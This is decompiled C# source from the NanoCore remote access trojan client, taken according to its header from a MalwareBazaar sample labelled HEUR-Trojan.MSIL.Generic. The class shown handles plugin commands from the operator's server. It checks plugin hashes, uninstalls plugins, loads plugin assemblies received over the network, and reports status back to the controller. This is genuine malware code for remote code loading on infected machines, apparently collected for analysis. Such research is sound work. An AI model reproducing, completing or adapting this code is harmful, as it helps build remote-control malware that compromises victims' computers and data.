// Decompiled with JetBrains decompiler
// Type: Class5
// Assembly: NanoCore Client, Version=1.2.2.0, Culture=neutral, PublicKeyToken=null
// MVID: 3E6578E1-28C0-4BF9-8DBD-C31738BD9814
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Generic-09efb455bb0ce60c3e25c3d2179b7494a69efdee0507cc96a46e1bc838d60041.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;

[StandardModule]
internal sealed class Class5
{
  public static bool bool_0;
  public static bool bool_1;

  public static void smethod_0(GStruct2 gstruct2_0)
  {
    switch (gstruct2_0.byte_1)
    {
      case 0:
        Class5.smethod_1(gstruct2_0.object_0);
        break;
      case 1:
        Class5.smethod_2(gstruct2_0.object_0);
        break;
      case 2:
        Class5.smethod_3(gstruct2_0.object_0);
        break;
      case 3:
        Class5.smethod_4(gstruct2_0.object_0);
        break;
    }
  }

  public static void smethod_1(object[] object_0)
  {
    Class5.bool_1 = false;
    Class8.int_1 = 0;
    if (Class8.queue_0.Count != 0)
      Class20.smethod_7(Class8.queue_0.Dequeue());
    byte[] byte_1 = (byte[]) object_0[0];
    Class5.smethod_5(Class8.byte_1 == null || !Class26.smethod_5(Class8.byte_0, byte_1));
  }

  public static void smethod_2(object[] object_0)
  {
    DateTime dateTime = (DateTime) object_0[0];
    byte[] numArray = (byte[]) object_0[1];
    Class8.dateTime_0 = dateTime;
    Class8.byte_1 = numArray;
    Class8.byte_0 = Class27.smethod_2(Class8.byte_1);
    Class8.smethod_9();
    Class5.smethod_6();
  }

  public static void smethod_3(object[] object_0)
  {
    try
    {
      List<object> objectList = new List<object>();
      List<Guid> guidList = new List<Guid>();
      int num = object_0.Length - 1;
      for (int index = 0; index <= num; index += 3)
      {
        Guid guid_0 = (Guid) object_0[index];
        byte[] byte_1 = (byte[]) object_0[index + 1];
        bool flag = (bool) object_0[index + 2];
        guidList.Add(guid_0);
        GClass2 gclass2 = Class23.smethod_1(guid_0);
        if (gclass2 == null)
        {
          objectList.Add((object) guid_0);
        }
        else
        {
          if (gclass2.bool_0 != flag)
          {
            gclass2.bool_0 = flag;
            Class5.bool_1 = true;
          }
          if (!Class26.smethod_5(gclass2.byte_1, byte_1))
          {
            objectList.Add((object) guid_0);
            Class5.bool_0 = true;
            Class8.smethod_87(string.Format("Plugin [{0}] requires an update.", (object) guid_0));
          }
        }
      }
      Class8.smethod_5(guidList.ToArray());
      try
      {
        foreach (GClass2 gclass2 in Class8.list_2)
        {
          if (!guidList.Contains(gclass2.guid_0))
          {
            Class5.bool_0 = true;
            Class8.smethod_87(string.Format("Plugin [{0}] is being uninstalled.", (object) gclass2.guid_0));
            if (gclass2.bool_0)
              Class5.bool_1 = true;
            if (gclass2.gclass3_0 != null)
            {
              try
              {
                gclass2.gclass3_0.method_8();
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                Exception exception_0 = ex;
                Class8.smethod_85(gclass2.gclass3_0, exception_0, "PluginUninstalling");
                ProjectData.ClearProjectError();
              }
            }
          }
        }
      }
      finally
      {
        List<GClass2>.Enumerator enumerator;
        enumerator.Dispose();
      }
      if (objectList.Count == 0 && Class5.bool_0)
      {
        if (Class5.bool_1)
          Class8.smethod_7();
        Class8.smethod_41();
      }
      else
        Class8.smethod_88(Class8.client_0, true, CommandType.PluginCommand, (byte) 2, objectList.ToArray());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      Class8.smethod_86(ex, "HandlePluginDetailsCommand");
      ProjectData.ClearProjectError();
    }
  }

  public static void smethod_4(object[] object_0)
  {
    List<GClass2> gclass2List = new List<GClass2>();
    int num = object_0.Length - 1;
    for (int index = 0; index <= num; index += 5)
    {
      GClass2 gclass2 = new GClass2()
      {
        guid_0 = (Guid) object_0[index],
        dateTime_0 = (DateTime) object_0[index + 1],
        string_0 = (string) object_0[index + 2],
        bool_0 = (bool) object_0[index + 3],
        byte_0 = (byte[]) object_0[index + 4]
      };
      gclass2.byte_1 = Class27.smethod_2(gclass2.byte_0);
      Class8.list_2.Add(gclass2);
      gclass2List.Add(gclass2);
      if (gclass2.bool_0)
        Class5.bool_1 = true;
    }
    if (Class5.bool_1)
      Class8.smethod_7();
    if (Class5.bool_0)
    {
      Class8.smethod_41();
    }
    else
    {
      Class8.smethod_87("Loading plugins..");
      try
      {
        foreach (GClass2 gclass2_0 in gclass2List)
          Class23.smethod_0(gclass2_0.byte_0, gclass2_0);
      }
      finally
      {
        List<GClass2>.Enumerator enumerator;
        enumerator.Dispose();
      }
      Class8.smethod_88(Class8.client_0, true, CommandType.PluginCommand, (byte) 3, new object[0]);
    }
  }

  public static void smethod_5(bool bool_2) => Class8.smethod_88(Class8.client_0, true, CommandType.PluginCommand, (byte) 0, new object[1]
  {
    (object) bool_2
  });

  public static void smethod_6() => Class8.smethod_88(Class8.client_0, true, CommandType.PluginCommand, (byte) 1, new object[0]);
}
